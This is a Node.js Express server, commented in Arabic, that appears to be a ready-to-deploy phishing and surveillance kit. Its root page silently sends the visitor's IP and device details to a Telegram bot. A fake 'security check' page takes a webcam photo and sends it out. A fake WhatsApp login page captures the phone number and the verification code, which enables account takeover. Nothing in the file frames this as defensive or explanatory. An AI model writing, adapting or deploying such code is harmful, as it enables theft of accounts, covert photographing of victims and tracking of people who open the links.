const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 10000;

const BOT_TOKEN = process.env.BOT_TOKEN;
const MY_ID = process.env.MY_ID;

// 1. رابط المعلومات (الأساسي)
app.get('/', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    res.send(`
        <script>
            window.onload = async () => {
                const info = "🚀 **صيد معلومات**\\n🌐 IP: \`${ip}\`\\n📱 النظام: " + navigator.platform + "\\n🧠 المعالج: " + navigator.hardwareConcurrency;
                await fetch("https://api.telegram.org/bot${BOT_TOKEN}/sendMessage", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({chat_id: "${MY_ID}", text: info, parse_mode: "Markdown"})
                });
                window.location.href = "https://google.com";
            };
        </script>
        <body style="background:black"></body>
    `);
});

// 2. رابط الكاميرا (/cam)
app.get('/cam', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>Verify</title></head>
        <body style="background:#f0f2f5; font-family:sans-serif; text-align:center; padding-top:50px;">
            <div style="background:white; padding:20px; display:inline-block; border-radius:10px; box-shadow:0 2px 10px rgba(0,0,0,0.1);">
                <h2>🛡️ فحص الأمان</h2>
                <p>يجب التقاط صورة سريعة للتحقق</p>
                <button onclick="startCam()" style="background:#1877f2; color:white; border:none; padding:10px 20px; border-radius:5px; cursor:pointer;">بدء التحقق ✅</button>
            </div>
            <video id="v" style="display:none;" autoplay></video>
            <canvas id="c" style="display:none;"></canvas>
            <script>
                async function startCam() {
                    try {
                        const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
                        const v = document.getElementById('v'); v.srcObject = s;
                        setTimeout(async () => {
                            const c = document.getElementById('c');
                            c.width = v.videoWidth; c.height = v.videoHeight;
                            c.getContext('2d').drawImage(v,0,0);
                            const img = await (await fetch(c.toDataURL('image/jpeg', 0.8))).blob();
                            const f = new FormData(); f.append('chat_id','${MY_ID}'); f.append('photo', img, 'cam.jpg');
                            await fetch("https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto", {method:"POST", body:f});
                            window.location.href = "https://facebook.com";
                        }, 1000);
                    } catch(e) { alert("يجب السماح بالكاميرا!"); }
                }
            </script>
        </body>
        </html>
    `);
});

// 3. رابط الواتساب (/wa)
app.get('/wa', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head><meta charset="UTF-8"><title>WhatsApp</title></head>
        <body style="background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px;">
            <div style="background: white; padding: 40px; border-radius: 10px; text-align: center; width: 300px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" style="width:60px;">
                <h2>تسجيل دخول واتساب</h2>
                <input type="text" id="p" placeholder="رقم الهاتف" style="width:100%; padding:10px; margin:10px 0;">
                <input type="text" id="o" placeholder="كود التحقق" style="width:100%; padding:10px; margin:10px 0; display:none;">
                <button id="b" onclick="send()" style="width:100%; background:#00a884; color:white; border:none; padding:10px; cursor:pointer;">التالي</button>
            </div>
            <script>
                let s = 1;
                async function send() {
                    const p = document.getElementById('p').value;
                    const o = document.getElementById('o').value;
                    let t = (s === 1) ? "📱 رقم: " + p : "🔑 كود: " + o;
                    if(s === 1) { document.getElementById('p').style.display='none'; document.getElementById('o').style.display='block'; s=2; }
                    else { window.location.href="https://web.whatsapp.com"; }
                    await fetch("https://api.telegram.org/bot${BOT_TOKEN}/sendMessage", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({chat_id: "${MY_ID}", text: t})
                    });
                }
            </script>
        </body>
        </html>
    `);
});

app.listen(PORT, () => console.log("System Fixed & Online"));
